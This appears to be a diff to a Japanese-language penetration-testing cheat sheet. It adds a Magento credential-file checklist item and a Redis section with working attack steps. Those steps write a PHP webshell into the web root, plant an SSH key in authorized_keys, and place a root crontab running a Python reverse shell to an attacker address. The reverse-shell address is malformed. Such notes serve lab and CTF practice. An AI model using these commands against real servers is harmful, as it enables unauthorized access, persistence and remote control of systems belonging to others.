@@ -315,7 +315,7 @@ ffuf -w sublists.txt -u http://website.com/ -H “Host: FUZZ.website.com” -fw 
 - -fr...正規表現のパターンでフィルタリング
 
 ### ディレクトリスキャン
-#### ^dirb
+#### dirb
 ```
 dirb http://website.com -r -z 10
 ```
@@ -464,7 +464,7 @@ C:\Windows\System32\config\RegBack\SAM.OLD
 C:\Windows\System32\config\RegBack\SYSTEM.OLD
 ```
 ```
-pwdump systemfile samfile
+pwdump SYSTEM SAM
 
 samdump2 SYSTEM SAM
 
@@ -797,6 +797,17 @@ $databases = array (
   ),
 );
 ```
+
+### Magento
+#### チェック項目
+```
+# DBのアカウント情報などを確認(MySQL)
+app/etc/local.xml
+```
+
+#### magescan
+magescan:  
+https://github.com/steverobbins/magescan.git
 
 ## phpMyAdmin
 MySQLサーバをWebブラウザで管理するためのデータベース接続ツール。  
@@ -1254,7 +1265,62 @@ grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <passw
 ```
 
 ## Redis(6379)
-[]
+接続:
+```
+redis-cli -h 10.10.10.160
+```
+
+Webshell:  
+Webサイトのディクレクトリ配下に書き込み権限がある場合に任意のPHPを仕込める。る
+```
+kali@kali:~# redis-cli -h 10.10.10.160
+10.10.10.160:6379> config set dir /var/www/html/
+OK # nginxの場合は/usr/share/nginx/html
+10.10.10.160:6379> config set dbfilename redis.php
+OK
+10.10.10.160:6379> set test "<?php phpinfo(); ?>"
+OK
+10.10.10.160:6379> save
+OK
+```
+
+
+SSH:  
+"config get dir"コマンドによりredisユーザのhomeを確認d家いる。  
+これにより.ssh配下に書き込み権限がある場合に公開鍵を配置してやることでアクセスが可能になる。
+```
+ssh-keygen -t rsa -f id_rsa
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt
+cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
+```
+```
+kali@kali:~# redis-cli -h 10.10.10.160
+10.10.10.160:6379> config get dir
+1) "dir"
+2) "/var/lib/redis"　# /var/lib/redis or /home/redis/.ssh
+10.10.10.160:6379> config set dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379> config set dbfilename "authorized_keys"
+OK
+10.10.10.160:6379> save
+OK
+
+kali@kali:~# ssh -i id_rsa redis@10.10.10.160
+```
+
+Crontab:  
+/var/spool/cron/crontabsにアクセスできる場合、以下の方法でreverse shellを取得可能。
+```
+kali@kali:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.1603\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.10.10.160 -x set 1
+OK
+kali@kali:~# redis-cli -h 10.10.10.160
+10.10.10.160:6379> config set dir /var/spool/cron/crontabs/
+OK
+10.10.10.160:6379> config set dbfilename root
+OK
+10.10.10.160:6379> save
+OK
+```
 
 # Exploitation
 ## ^reverse shell
